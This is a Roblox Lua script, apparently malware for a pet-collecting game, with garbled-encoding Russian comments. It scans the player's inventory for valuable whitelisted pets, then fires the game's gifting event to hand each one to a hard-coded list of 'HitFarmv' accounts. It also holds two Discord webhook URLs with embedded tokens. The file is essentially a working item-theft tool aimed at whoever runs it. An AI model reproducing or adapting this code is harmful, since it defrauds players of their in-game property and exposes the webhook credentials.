No
if getgenv().scriptAlreadyRan then
    warn("‚ö†Ô∏è Script already ran.")
    return
end
getgenv().scriptAlreadyRan = true

-- üîß Configuration
getgenv().MinLevel = 75       -- Minimum pet level
getgenv().MinWeight = 20      -- Minimum pet weight
local GROWTH_FACTOR = 0.1     -- Weight growth factor
local WEBHOOK_LOW = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"
local WEBHOOK_HIGH = "https://discord.com/api/webhooks/1401554249158230216/7H-IIQH6rGTSntv0Du-Dbk2sYzCSYbLHKd-m-j_paAZwh8V4Yj5ec-J4StSZWWB8zqYn"
local WEBHOOK_THRESHOLD = 1900 -- Threshold for high-value webhook
local MAX_OCCUPANCY = 2        -- Max players for server hopping

-- Pet whitelist and values
local PET_WHITELIST = {
    "Raccoon", "T-Rex", "Fennec Fox", "Dragonfly", "Butterfly",
    "Disco Bee", "Mimic Octopus", "Queen Bee", "Spinosaurus",
    "Kitsune", "French Fry Ferret", "Corrupted Kitsune", "Lobster Thermidor"
}
local PET_VALUES = {
    ["French Fry Ferret"] = 1500, ["Raccoon"] = 1900, ["T-Rex"] = 400,
    ["Fennec Fox"] = 1500, ["Dragonfly"] = 500, ["Butterfly"] = 1200,
    ["Disco Bee"] = 2000, ["Mimic Octopus"] = 500, ["Queen Bee"] = 400,
    ["Spinosaurus"] = 500, ["Kitsune"] = 7500, ["Corrupted Kitsune"] = 300,
    ["Lobster Thermidor"] = 1900
}

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local TweenService = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local dataModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))
local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")

-- Target usernames
local USERNAMES = {
    "HitFarmv20", "HitFarmv21", "HitFarmv22", "HitFarmv23",
    "HitFarmv24", "HitFarmv25", "HitFarmv26", "HitFarmv27", "HitFarmv28",
    "HitFarmv29", "HitFarmZ"
}





-- –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –ø–µ—Ç–æ–≤ –∏–∑ –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è
local inventory = dataModule:Get(LocalPlayer, "Inventory").Pets
local petList = {}

for uid, pet in pairs(inventory) do
    local petName = pet.Name
    local petLevel = pet.Level or 0
    local petWeight = pet.Weight or 0
    local value = PET_VALUES[petName] or 0

    -- –§–∏–ª—å—Ç—Ä–∞—Ü–∏—è: –ø–æ whitelist –∏ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–º –∑–Ω–∞—á–µ–Ω–∏—è–º
    if table.find(PET_WHITELIST, petName) 
        and petLevel >= getgenv().MinLevel 
        and petWeight >= getgenv().MinWeight then
        table.insert(petList, {
            uid = uid,
            name = petName,
            level = petLevel,
            weight = petWeight,
            value = value
        })
    end
end



-- üéÅ –ü–µ—Ä–µ–¥–∞—á–∞ –ø–µ—Ç–æ–≤ –∏–≥—Ä–æ–∫–∞–º –∏–∑ USERNAMES
for _, pet in ipairs(petList) do
    for _, targetName in ipairs(USERNAMES) do
        local recipient = Players:FindFirstChild(targetName)
        if recipient and recipient:IsA("Player") then
            local args = {
                [1] = "GivePet",
                [2] = recipient,
                [3] = pet.uid
            }

            local success, err = pcall(function()
                ReplicatedStorage:WaitForChild("GameEvents", 9e9)
                    :WaitForChild("PetGiftingService", 9e9)
                    :FireServer(unpack(args))
            end)

            if success then
                print(string.format("‚úÖ Successfully gave %s (UID: %s) to %s", pet.name, pet.uid, targetName))
            else
                warn(string.format("‚ùå Failed to give %s (UID: %s) to %s | %s", pet.name, pet.uid, targetName, err))
            end

            task.wait(1.3) -- ‚è≥ –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–µ—Ä–µ–¥–∞—á–∞–º–∏
        else
            warn("‚ö†Ô∏è Player not found in server:", targetName)
        end
    end
end
